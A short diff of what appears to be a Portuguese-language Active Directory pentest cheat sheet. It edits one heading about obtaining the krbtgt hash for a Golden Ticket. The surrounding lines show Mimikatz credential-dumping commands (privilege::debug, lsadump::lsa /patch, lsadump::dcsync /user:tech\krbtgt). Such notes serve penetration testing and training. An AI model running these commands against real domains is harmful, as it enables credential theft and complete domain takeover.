@@ -1247,7 +1247,7 @@ Invoke-Mimikatz
 privilege::debug
 lsadump::lsa /patch
 ```
-##### GOLDEN TICKET MIMIKATZ - PEGAR O HASH DE KRBTGT (COMO ADMIN MAS TERMINAM NORMAL):
+##### GOLDEN TICKET MIMIKATZ - PEGAR O HASH DE KRBTGT (COMO ADMIN MAS TERMINAL NORMAL E DE QQ MAQUINA):
 ```
 Invoke-Mimikatz
 lsadump::dcsync /user:tech\krbtgt
